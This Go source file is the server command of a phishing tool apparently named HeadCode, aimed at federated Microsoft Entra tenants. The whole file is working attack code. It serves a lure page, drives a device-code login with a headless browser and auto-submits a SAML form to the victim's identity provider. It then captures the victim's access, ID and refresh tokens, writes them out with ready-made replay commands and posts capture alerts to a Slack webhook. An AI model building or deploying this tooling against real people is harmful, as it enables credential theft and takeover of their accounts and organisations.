package cmd

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/h0useh3ad/HeadCode/pkg/blocklist"
	"github.com/h0useh3ad/HeadCode/pkg/constants"
	"github.com/h0useh3ad/HeadCode/pkg/entra"
	"github.com/spf13/cobra"

	"golang.org/x/crypto/acme/autocert"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"

type multiHandler struct {
	handlers []slog.Handler
}

func (h *multiHandler) Enabled(ctx context.Context, level slog.Level) bool {
	// Enabled if any of the handlers are enabled
	for _, handler := range h.handlers {
		if handler.Enabled(ctx, level) {
			return true
		}
	}
	return false
}

func (h *multiHandler) Handle(ctx context.Context, record slog.Record) error {
	// Write to all handlers
	for _, handler := range h.handlers {
		if err := handler.Handle(ctx, record.Clone()); err != nil {
			return err
		}
	}
	return nil
}

func (h *multiHandler) WithAttrs(attrs []slog.Attr) slog.Handler {
	// Create a new multiHandler with WithAttrs called on each handler
	newHandlers := make([]slog.Handler, 0, len(h.handlers))
	for _, handler := range h.handlers {
		newHandlers = append(newHandlers, handler.WithAttrs(attrs))
	}
	return &multiHandler{handlers: newHandlers}
}

func (h *multiHandler) WithGroup(name string) slog.Handler {
	// Create a new multiHandler with WithGroup called on each handler
	newHandlers := make([]slog.Handler, 0, len(h.handlers))
	for _, handler := range h.handlers {
		newHandlers = append(newHandlers, handler.WithGroup(name))
	}
	return &multiHandler{handlers: newHandlers}
}

var (
	address         string
	customUserAgent string
	userAgent       string
	clientId        string
	customClientId  string
	targetDomain    string
	pathPrefix      string
	domain          string
	certFile        string
	keyFile         string
	blocklistFile      string
	logFile            string
	tokenFile          string
	trustedProxyHeader string
	configFile         string
	slackWebhook       string
	tenantInfo         *entra.TenantInfo
)

type serverConfig struct {
	Address            string `json:"address"`
	TargetDomain       string `json:"target_domain"`
	ClientId           string `json:"client_id"`
	CustomClientId     string `json:"custom_client_id"`
	UserAgent          string `json:"user_agent"`
	CustomUserAgent    string `json:"custom_user_agent"`
	Path               string `json:"path"`
	Domain             string `json:"domain"`
	Cert               string `json:"cert"`
	Key                string `json:"key"`
	Blocklist          string `json:"blocklist"`
	TrustedProxyHeader string `json:"trusted_proxy_header"`
	LogFile            string `json:"log_file"`
	TokenFile          string `json:"token_file"`
	SlackWebhook       string `json:"slack_webhook"`
	Verbose            bool   `json:"verbose"`
}

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Server listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Predefined User-Agent to use (see --help for list)")
	runCmd.Flags().StringVar(&customUserAgent, "custom-user-agent", EdgeOnWindows, "Custom User-Agent string")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", "", "ClientId key to use (see --help for predefined options)")
	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
	runCmd.Flags().StringVarP(&targetDomain, "target-domain", "t", "", "Target federated domain (required)")
	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path for the lure URL (e.g., /custom) - default is /lure")
	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain name for automatic HTTPS (uses Let's Encrypt)")
	runCmd.Flags().StringVar(&certFile, "cert", "", "Certificate file for HTTPS (also requires --key)")
	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
	runCmd.Flags().StringVarP(&blocklistFile, "blocklist", "b", "", "Blocklist file containing IP addresses and CIDR ranges to block")
	runCmd.Flags().StringVarP(&logFile, "log-file", "l", "", "File to write logs to (default is stdout only)")
	runCmd.Flags().StringVar(&tokenFile, "token-file", "", "File to write captured tokens to (restricted permissions, 0600)")
	runCmd.Flags().StringVar(&trustedProxyHeader, "trusted-proxy-header", "", "Trusted proxy preset for client IP resolution: frontdoor, cloudfront (default: use RemoteAddr)")
	runCmd.Flags().StringVar(&slackWebhook, "slack-webhook", "", "Slack incoming webhook URL for token capture notifications")
	runCmd.Flags().StringVar(&configFile, "config", "", "Path to JSON config file (flags override config file values)")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure

Available User-Agent options for --user-agent:
  Windows:
    edge-windows          - Edge on Windows (Chromium)
    chrome-windows        - Chrome on Windows
    firefox-windows       - Firefox on Windows
    brave-windows         - Brave on Windows
    opera-windows         - Opera on Windows
  macOS:
    edge-macos            - Edge on macOS
    chrome-macos          - Chrome on macOS
    firefox-macos         - Firefox on macOS
    safari-macos          - Safari on macOS
    brave-macos           - Brave on macOS
  Linux:
    edge-linux            - Edge on Linux
    chrome-linux          - Chrome on Linux
    firefox-linux         - Firefox on Linux
    brave-linux           - Brave on Linux
    opera-linux           - Opera on Linux
  iOS:
    edge-ios              - Edge on iOS
    chrome-ios            - Chrome on iOS
    safari-ios            - Safari on iOS
    firefox-ios           - Firefox on iOS
  Android:
    edge-android          - Edge on Android
    chrome-android        - Chrome on Android
    firefox-android       - Firefox on Android
    samsung-android       - Samsung Internet on Android
  iPad:
    safari-ipad           - Safari on iPad
    chrome-ipad           - Chrome on iPad

Available ClientId options for --client-id:
  msauthbroker          - Microsoft Authentication Broker (default)
  office365             - Office 365 Management
  azurecli              - Microsoft Azure CLI
  officeuwa             - Office UWP PWA
  msdocs                - Microsoft Docs
  azurepowershell       - Microsoft Azure PowerShell
  windowsspotlight      - Windows Spotlight
  aadpowershell         - Azure Active Directory PowerShell
  msteams               - Microsoft Teams
  mstodo                - Microsoft To-Do client
  universalstore        - Universal Store Native Client
  winsearch             - Windows Search
  outlook               - Outlook Mobile
  bingsearch            - Microsoft Bing Search for Microsoft Edge
  authenticator         - Microsoft Authenticator App
  powerapps             - PowerApps
  whiteboard            - Microsoft Whiteboard Client
  flow                  - Microsoft Flow Mobile
  roamingbackup         - Enterprise Roaming and Backup
  planner               - Microsoft Planner
  stream                - Microsoft Stream Mobile Native
  visualstudio          - Visual Studio - Legacy
  teamsadmin            - Microsoft Teams - Device Admin Agent
  aadrmpowershell       - Aadrm Admin PowerShell
  intune                - Microsoft Intune Company Portal
  sporemote             - Microsoft SharePoint Online Management Shell
  exchangepowershell    - Microsoft Exchange Online Remote PowerShell
  accountcontrol        - Accounts Control UI
  yammerphone           - Yammer iPhone
  onedrive              - OneDrive Sync Engine
  onedriveios           - OneDrive iOS App
  ondriveconsumer       - OneDrive (Consumer)
  aadjcsp               - AADJ CSP
  powerbi               - Microsoft Power BI
  spoextension          - SharePoint Online Client Extensibility
  aadconnect            - Microsoft Azure AD Connect
  bing                  - Microsoft Bing Search
  sharepoint            - SharePoint
  office                - Microsoft Office
  outlooklite           - Outlook Lite
  modernedge            - Microsoft Edge (Modern)
  tunnel                - Microsoft Tunnel
  edgemobile            - Microsoft Edge (Mobile)
  spandroid             - SharePoint Android
  dynamics365           - Media Recording for Dynamics 365 Sales
  edgewebview           - Microsoft Edge (WebView)
  exchangerest          - Microsoft Exchange REST API Based PowerShell
  intuneagent           - Microsoft Intune Windows Agent

Examples:
  # Using predefined options
  HeadCode server --user-agent chrome-android --client-id msteams
  
  # Using custom ClientId  
  HeadCode server --custom-client-id "your-custom-clientid-guid"
  
  # With custom path (URL will be /auth)
  HeadCode server --path /auth --client-id azurecli
  
  # With blocklist
  HeadCode server --blocklist blocklist.txt --client-id office365
  
  # With automatic HTTPS (Let's Encrypt) - allows domain and all subdomains
  HeadCode server --domain example.com --client-id office365
  # This will accept: example.com, login.example.com, api.example.com, etc.
  
  # With custom SSL certificates
  HeadCode server --cert cert.pem --key key.pem --client-id msteams
  
  # Full example with blocklist
  HeadCode server --blocklist blocklist.txt --domain example.com --cert cert.pem --key key.pem

  # With log file
  HeadCode server --log-file dcp_web.log --client-id msteams

  # With token file (tokens written to restricted file, 0600 permissions)
  HeadCode server --token-file tokens.txt --client-id msteams

  # Full example with blocklist and logging
  HeadCode server --blocklist blocklist.txt --log-file dcp_web.log --domain example.com

Blocklist Format:
  The blocklist file should contain one IP address or CIDR range per line.
  Empty lines and lines starting with # are ignored.
  Examples:
    192.168.1.0/24
    10.0.0.1
    172.16.5.0/24
    # This is a comment
    8.8.8.8
    2001:db8::/32

Note: Cannot specify both --client-id and --custom-client-id simultaneously
Note: When using --domain, the domain must be properly configured to point to this server's IP
Note: With --domain, all subdomains are automatically accepted
Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if both are specified`,
	Run: func(cmd *cobra.Command, args []string) {

		// Load config file if specified (flags take precedence)
		if configFile != "" {
			loadConfigFile(cmd, configFile)
		}

		// Configure logging with dynamic level
		var logLevel slog.LevelVar
		if verbose {
			logLevel.Set(slog.LevelDebug)
		}

		var logHandlers []slog.Handler
		stdoutHandler := slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: &logLevel})
		logHandlers = append(logHandlers, stdoutHandler)

		// If log file is specified, add file handler
		if logFile != "" {
			file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
			if err != nil {
				slog.Error("Failed to open log file", "file", logFile, "error", err)
				os.Exit(1)
			}

			fileHandler := slog.NewTextHandler(file, &slog.HandlerOptions{Level: &logLevel})
			logHandlers = append(logHandlers, fileHandler)
		}

		// Set default logger
		if len(logHandlers) > 1 {
			logger := slog.New(&multiHandler{handlers: logHandlers})
			slog.SetDefault(logger)
			slog.Info("Logging to file enabled", "file", logFile)
		} else {
			slog.SetDefault(slog.New(logHandlers[0]))
		}

		// Determine which user agent to use
		finalUserAgent := customUserAgent
		if userAgent != "" {
			if ua, ok := constants.PredefinedUserAgents[userAgent]; ok {
				finalUserAgent = ua
			} else {
				slog.Error("Invalid user-agent", "provided", userAgent, "available", strings.Join(getAvailableUserAgents(), ", "))
				os.Exit(1)
			}
		}

		// Determine which ClientId to use
		finalClientId := ""

		// Check if both client-id and custom-client-id are provided
		if clientId != "" && customClientId != "" {
			slog.Error("Cannot specify both --client-id and --custom-client-id",
				"clientId", clientId,
				"customClientId", customClientId)
			os.Exit(1)
		}

		// Use predefined ClientId
		if clientId != "" {
			if cid, ok := constants.PredefinedClientIds[clientId]; ok {
				finalClientId = cid
			} else {
				slog.Error("Invalid client-id", "provided", clientId, "available", strings.Join(getAvailableClientIds(), ", "))
				os.Exit(1)
			}
		}

		// Use custom ClientId
		if customClientId != "" {
			finalClientId = customClientId
		}

		// If no ClientId specified, use default
		if finalClientId == "" {
			finalClientId = MsAuthenticationBroker
		}

		// Sanitize path prefix
		if pathPrefix != "" {
			if !strings.HasPrefix(pathPrefix, "/") {
				pathPrefix = "/" + pathPrefix
			}
			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
		}

		// Resolve trusted proxy headers
		trustedHeaders := resolveTrustedHeaders(trustedProxyHeader)
		if trustedProxyHeader != "" {
			slog.Info("Trusted proxy header configured", "preset", trustedProxyHeader, "headers", trustedHeaders)
		}

		// Set up a single resource handler
		lurePath := pathPrefix
		if lurePath == "" {
			lurePath = "/lure"
		}
		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent, tokenFile, trustedHeaders))

		host, port, err := net.SplitHostPort(address)
		if err != nil || port == "" {
			slog.Error("Invalid address format", "address", address, "error", err)
			os.Exit(1)
		}

		// Federation preflight check
		if targetDomain == "" {
			slog.Error("Target domain must be set (use --target-domain)")
			os.Exit(1)
		}
		targetDomain = strings.ToLower(targetDomain)

		tenantInfo, err = entra.GetTenantInfo(targetDomain)
		if err != nil {
			slog.Error("TenantInfo cannot be retrieved", "error", err)
			os.Exit(1)
		}

		if tenantInfo == nil {
			slog.Error("TenantInfo cannot be retrieved")
			os.Exit(1)
		}

		if tenantInfo.UserRealmInfo.NameSpaceType != "Federated" {
			slog.Error("Domain is not federated — this technique requires a federated tenant",
				"domain", targetDomain, "tenantId", tenantInfo.TenantId)
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr:         address,
			ReadTimeout:  10 * time.Second,
			WriteTimeout: 30 * time.Second,
			IdleTimeout:  120 * time.Second,
		}

		// Initialize blocklist if provided
		var blocklistMiddleware func(http.Handler) http.Handler
		if blocklistFile != "" {
			// Load blocklist
			bl, err := blocklist.New(blocklistFile)
			if err != nil {
				slog.Error("Failed to load blocklist", "file", blocklistFile, "error", err)
				os.Exit(1)
			}

			// Hot-reload blocklist every 30 seconds
			bl.StartAutoReload(blocklistFile, 30*time.Second)

			// Create middleware
			blocklistMiddleware = blocklist.Middleware(bl, trustedHeaders)
			slog.Info("Blocklist enabled", "file", blocklistFile, "autoReload", "30s")
		}

		// Wrap the default ServeMux with middleware
		var handler http.Handler = http.DefaultServeMux
		if blocklistMiddleware != nil {
			handler = blocklistMiddleware(http.DefaultServeMux)
		}
		server.Handler = handler

		// Validate certificate files if provided
		useCustomCerts := false
		if certFile != "" || keyFile != "" {
			if certFile == "" || keyFile == "" {
				slog.Error("Both --cert and --key must be provided for custom certificates")
				os.Exit(1)
			}

			// Check if cert file exists
			if _, err := os.Stat(certFile); os.IsNotExist(err) {
				slog.Error("Certificate file does not exist", "file", certFile)
				os.Exit(1)
			}

			// Check if key file exists
			if _, err := os.Stat(keyFile); os.IsNotExist(err) {
				slog.Error("Key file does not exist", "file", keyFile)
				os.Exit(1)
			}

			useCustomCerts = true
		}

		// Configure SSL/TLS if requested
		isHTTPS := false
		protocol := "http"
		useAutoSSL := false

		// Check if we're using both Let's Encrypt and custom certs (not allowed)
		if domain != "" && useCustomCerts {
			// Custom certificates take precedence
			slog.Warn("Using custom certificates, ignoring Let's Encrypt for domain")
		}

		// Determine if we're using Let's Encrypt
		if domain != "" && !useCustomCerts {
			useAutoSSL = true
		}

		if useCustomCerts || useAutoSSL {
			isHTTPS = true
			protocol = "https"

			// If using Let's Encrypt, typically run on port 443
			if useAutoSSL && address == ":8080" {
				address = ":443"
				server.Addr = address
				// Re-parse the address
				host, port, err = net.SplitHostPort(address)
				if err != nil || port == "" {
					slog.Error("Invalid address format", "address", address, "error", err)
					os.Exit(1)
				}
			}
		}

		slog.Info("Start Server",
			"domain", tenantInfo.Domain,
			"tenantId", tenantInfo.TenantId,
			"clientId", finalClientId,
			"userAgent", finalUserAgent)

		if host == "" {
			host = "localhost"
		}

		slog.Info("Lure available at", "url", protocol+"://"+host+":"+port+lurePath)

		// Attempt to get public IP
		publicIP := getPublicIP()
		if publicIP != "" {
			// Use domain name if provided, otherwise use public IP
			if domain != "" {
				slog.Info("Public URL", "url", protocol+"://"+domain+":"+port+lurePath)
			} else {
				slog.Info("Public URL", "url", protocol+"://"+publicIP+":"+port+lurePath)
			}
		}

		if useAutoSSL {
			slog.Info("Using automatic HTTPS with Let's Encrypt", "domain", domain)
		} else if useCustomCerts {
			slog.Info("Using custom SSL certificates", "cert", certFile, "key", keyFile, "domain", domain)
		}

		// Start the server
		if isHTTPS {
			if useAutoSSL {
				// Use Let's Encrypt for automatic HTTPS
				certManager := autocert.Manager{
					Prompt:     autocert.AcceptTOS,
					HostPolicy: allowSubdomains(domain),
					Cache:      autocert.DirCache("certs"),
					Email:      "", // Optional: add email for notifications
				}
				server.TLSConfig = certManager.TLSConfig()

				// Add /.well-known/acme-challenge handler for HTTP-01 challenge
				httpServer := &http.Server{
					Addr:    ":80",
					Handler: certManager.HTTPHandler(nil),
				}
				go func() {
					err := httpServer.ListenAndServe()
					if err != nil && err != http.ErrServerClosed {
						slog.Error("Failed to start HTTP server for ACME challenges", "error", err)
					}
				}()

				log.Fatal(server.ListenAndServeTLS("", ""))
			} else {
				// Use custom certificates
				log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
			}
		} else {
			// HTTP only
			log.Fatal(server.ListenAndServe())
		}
	},
}

// samlAutoSubmitTmpl renders a minimal HTML page with a hidden form that
// auto-submits via JavaScript. The victim's browser POSTs the SAMLRequest
// directly to the federated IdP, so session cookies are set in their context.
var samlAutoSubmitTmpl = template.Must(template.New("saml").Parse(`<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
<form id="saml" method="POST" action="{{.URL}}">
{{range $key, $value := .PostData}}<input type="hidden" name="{{$key}}" value="{{$value}}">
{{end}}</form>
<script>document.getElementById('saml').submit();</script>
</body>
</html>`))

func getLureHandler(clientId string, userAgent string, tokenFile string, trustedHeaders []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		realClientIP := blocklist.GetClientIP(r, trustedHeaders)

		slog.Info("Lure opened",
			"clientId", clientId,
			"remoteAddr", r.RemoteAddr,
			"realIP", realClientIP,
			"visitor-user-agent", r.UserAgent())

		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")

		scopes := []string{"openid", "profile", "offline_access"}
		deviceAuth, err := entra.RequestDeviceAuth(tenantInfo.TenantId, clientId, scopes)
		if err != nil {
			slog.Error("Error starting device code flow", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		samlRedirect, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent, tenantInfo.Domain)
		if err != nil {
			slog.Error("Error during headless browser automation", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth, realClientIP, r.UserAgent(), tokenFile, slackWebhook)

		if samlRedirect.Method == "GET" {
			// WS-Federation: all state is in URL parameters, simple redirect
			slog.Info("Redirecting to federated IdP (WS-Federation GET)",
				"idpUrl", samlRedirect.URL)
			http.Redirect(w, r, samlRedirect.URL, http.StatusFound)
		} else {
			// SAML: serve auto-submit form so cookies are set in victim's browser
			slog.Info("Serving SAML auto-submit form",
				"idpUrl", samlRedirect.URL,
				"formFields", len(samlRedirect.PostData))

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			if err := samlAutoSubmitTmpl.Execute(w, samlRedirect); err != nil {
				slog.Error("Error rendering SAML form", "error", err)
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			}
		}
	}
}

func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string, tokenFile string, slackWebhook string) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
	deadline := time.Now().Add(time.Duration(deviceAuth.ExpiresIn) * time.Second)

	for {
		time.Sleep(pollInterval)

		if time.Now().After(deadline) {
			slog.Warn("Device code expired, stopping poll", "userCode", deviceAuth.UserCode)
			return
		}

		slog.Info("Checking for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
		result, err := entra.RequestToken(tenantId, clientId, deviceAuth)

		if err != nil {
			slog.Error("Error requesting token", "error", err)
			return
		}

		if result != nil {
			slog.Info("Token received",
				"userCode", deviceAuth.UserCode,
				"clientId", clientId,
				"clientIP", clientIP,
				"visitor-user-agent", visitorUserAgent)
			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
			slog.Info("ID TOKEN:", "token", result.IdToken)
			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)

			if tokenFile != "" {
				writeTokensToFile(tokenFile, result, deviceAuth.UserCode, clientId, clientIP, visitorUserAgent, tenantInfo.Domain)
			}
			if slackWebhook != "" {
				sendSlackNotification(slackWebhook, result, deviceAuth.UserCode, clientId, clientIP, tenantInfo.Domain)
			}
			return
		}
	}
}

func writeTokensToFile(tokenFile string, result *entra.AuthenticationResult, userCode string, clientId string, clientIP string, visitorUserAgent string, domain string) {
	f, err := os.OpenFile(tokenFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		slog.Error("Failed to write tokens to file", "file", tokenFile, "error", err)
		return
	}
	defer f.Close()

	timestamp := time.Now().UTC().Format(time.RFC3339)
	fmt.Fprintf(f, "=== Token Captured: %s ===\n", timestamp)
	fmt.Fprintf(f, "UserCode:     %s\n", userCode)
	fmt.Fprintf(f, "ClientId:     %s\n", clientId)
	fmt.Fprintf(f, "ClientIP:     %s\n", clientIP)
	fmt.Fprintf(f, "UserAgent:    %s\n", visitorUserAgent)
	fmt.Fprintf(f, "\n--- Raw Tokens ---\n")
	fmt.Fprintf(f, "AccessToken:  %s\n", result.AccessToken)
	fmt.Fprintf(f, "IdToken:      %s\n", result.IdToken)
	fmt.Fprintf(f, "RefreshToken: %s\n", result.RefreshToken)
	fmt.Fprintf(f, "\n--- Token Replay Commands ---\n")
	fmt.Fprintf(f, "\n# Azure CLI - import access token\n")
	fmt.Fprintf(f, "export AZURE_ACCESS_TOKEN='%s'\n", result.AccessToken)
	fmt.Fprintf(f, "\n# GraphRunner (PowerShell) - import tokens\n")
	fmt.Fprintf(f, "$tokens = @{}\n")
	fmt.Fprintf(f, "$tokens[\"access_token\"] = '%s'\n", result.AccessToken)
	fmt.Fprintf(f, "$tokens[\"refresh_token\"] = '%s'\n", result.RefreshToken)
	fmt.Fprintf(f, "# Then use: Invoke-GraphRunner -Tokens $tokens\n")
	fmt.Fprintf(f, "\n# TokenTacticsV2 (PowerShell) - refresh for new scopes\n")
	fmt.Fprintf(f, "$refreshToken = '%s'\n", result.RefreshToken)
	fmt.Fprintf(f, "Invoke-RefreshToMSGraphToken -refreshToken $refreshToken -domain %s\n", domain)
	fmt.Fprintf(f, "Invoke-RefreshToAzureManagementToken -refreshToken $refreshToken -domain %s\n", domain)
	fmt.Fprintf(f, "Invoke-RefreshToAzureCoreManagementToken -refreshToken $refreshToken -domain %s\n", domain)
	fmt.Fprintf(f, "# Note: TokenTacticsV2 returns an object — use $variable.access_token for the bearer token\n")
	fmt.Fprintf(f, "# Example: $headers = @{ Authorization = \"Bearer $($MSGraphToken.access_token)\" }\n")
	fmt.Fprintf(f, "\n# curl - direct Graph API call\n")
	fmt.Fprintf(f, "curl -s -H 'Authorization: Bearer %s' https://graph.microsoft.com/v1.0/me\n", result.AccessToken)
	fmt.Fprintf(f, "===\n\n")

	slog.Info("Tokens written to file", "file", tokenFile)
}

func sendSlackNotification(webhookURL string, result *entra.AuthenticationResult, userCode string, clientId string, clientIP string, domain string) {
	// Decode the access token to extract user info
	subject := "unknown"
	parts := strings.Split(result.AccessToken, ".")
	if len(parts) == 3 {
		// Pad base64 if needed
		payload := parts[1]
		if pad := len(payload) % 4; pad != 0 {
			payload += strings.Repeat("=", 4-pad)
		}
		decoded, err := base64.StdEncoding.DecodeString(payload)
		if err == nil {
			var claims map[string]interface{}
			if json.Unmarshal(decoded, &claims) == nil {
				if upn, ok := claims["upn"].(string); ok {
					subject = upn
				} else if email, ok := claims["email"].(string); ok {
					subject = email
				} else if sub, ok := claims["sub"].(string); ok {
					subject = sub
				}
			}
		}
	}

	msg := fmt.Sprintf(":fishing_pole_and_fish: *Token Captured*\n"+
		"*Domain:* %s\n"+
		"*Subject:* %s\n"+
		"*UserCode:* %s\n"+
		"*ClientId:* %s\n"+
		"*ClientIP:* %s\n"+
		"*Scope:* %s",
		domain, subject, userCode, clientId, clientIP, result.Scope)

	payload, err := json.Marshal(map[string]string{"msg": msg})
	if err != nil {
		slog.Error("Failed to marshal Slack payload", "error", err)
		return
	}

	resp, err := http.Post(webhookURL, "application/json", strings.NewReader(string(payload)))
	if err != nil {
		slog.Error("Failed to send Slack notification", "error", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		slog.Error("Slack webhook returned non-200", "status", resp.Status)
		return
	}

	slog.Info("Slack notification sent", "subject", subject)
}

func loadConfigFile(cmd *cobra.Command, path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		slog.Error("Failed to read config file", "file", path, "error", err)
		os.Exit(1)
	}

	var cfg serverConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		slog.Error("Failed to parse config file", "file", path, "error", err)
		os.Exit(1)
	}

	// Apply config values only where the flag was not explicitly set
	setIfNotChanged := func(name, value string) {
		if value != "" && !cmd.Flags().Changed(name) {
			_ = cmd.Flags().Set(name, value)
		}
	}

	setIfNotChanged("address", cfg.Address)
	setIfNotChanged("target-domain", cfg.TargetDomain)
	setIfNotChanged("client-id", cfg.ClientId)
	setIfNotChanged("custom-client-id", cfg.CustomClientId)
	setIfNotChanged("user-agent", cfg.UserAgent)
	setIfNotChanged("custom-user-agent", cfg.CustomUserAgent)
	setIfNotChanged("path", cfg.Path)
	setIfNotChanged("domain", cfg.Domain)
	setIfNotChanged("cert", cfg.Cert)
	setIfNotChanged("key", cfg.Key)
	setIfNotChanged("blocklist", cfg.Blocklist)
	setIfNotChanged("trusted-proxy-header", cfg.TrustedProxyHeader)
	setIfNotChanged("log-file", cfg.LogFile)
	setIfNotChanged("token-file", cfg.TokenFile)
	setIfNotChanged("slack-webhook", cfg.SlackWebhook)

	if cfg.Verbose && !cmd.Flags().Changed("verbose") {
		verbose = true
	}

	slog.Info("Loaded config file", "file", path)
}

func resolveTrustedHeaders(preset string) []string {
	switch strings.ToLower(preset) {
	case "frontdoor":
		// Azure Front Door sets X-Azure-ClientIP and X-Forwarded-For
		return []string{"X-Azure-ClientIP", "X-Forwarded-For"}
	case "cloudfront":
		// AWS CloudFront sets CloudFront-Viewer-Address (ip:port format)
		// and populates X-Forwarded-For
		return []string{"CloudFront-Viewer-Address", "X-Forwarded-For"}
	case "":
		return nil
	default:
		slog.Error("Unknown trusted-proxy-header preset", "preset", preset, "available", "frontdoor, cloudfront")
		os.Exit(1)
		return nil
	}
}

func getAvailableUserAgents() []string {
	agents := make([]string, 0, len(constants.PredefinedUserAgents))
	for key := range constants.PredefinedUserAgents {
		agents = append(agents, key)
	}
	return agents
}

func getAvailableClientIds() []string {
	clients := make([]string, 0, len(constants.PredefinedClientIds))
	for key := range constants.PredefinedClientIds {
		clients = append(clients, key)
	}
	return clients
}

// allowSubdomains returns a HostPolicy that accepts the main domain and all its subdomains
func allowSubdomains(domain string) autocert.HostPolicy {
	return func(_ context.Context, host string) error {
		// Allow exact match
		if host == domain {
			return nil
		}

		// Allow subdomains
		if strings.HasSuffix(host, "."+domain) {
			return nil
		}

		return fmt.Errorf("host %q not configured in domain whitelist", host)
	}
}

func getPublicIP() string {
	// Try multiple services to get the public IP
	services := []string{
		"https://api.ipify.org",
		"https://checkip.amazonaws.com",
		"https://icanhazip.com",
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for _, service := range services {
		resp, err := client.Get(service)
		if err != nil {
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		ip := strings.TrimSpace(string(body))
		if ip != "" {
			return ip
		}
	}

	return ""
}
